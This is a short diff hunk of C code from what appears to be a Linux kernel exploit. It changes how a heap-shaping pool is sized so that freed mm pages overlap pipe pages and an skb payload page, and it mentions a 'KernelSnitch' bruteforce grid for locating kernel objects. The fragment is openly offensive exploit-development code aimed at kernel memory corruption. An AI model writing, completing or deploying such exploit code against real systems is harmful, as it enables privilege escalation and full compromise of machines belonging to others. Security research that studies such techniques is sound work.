@@ -1028,7 +1028,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
 #endif
-  mm_objs_per_slab = (PAGE_SIZE << MM_SLAB_ORDER) / MM_STRUCT_SZ;
+  /*
+   * Heap-shaping pool stays ORDER3_SIZE-based so the freed mm-page pool is
+   * large enough for both the p0 pipe pages and the skb payload page to
+   * overlap; MM_SLAB_ORDER only drives the KernelSnitch bruteforce grid.
+   */
+  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
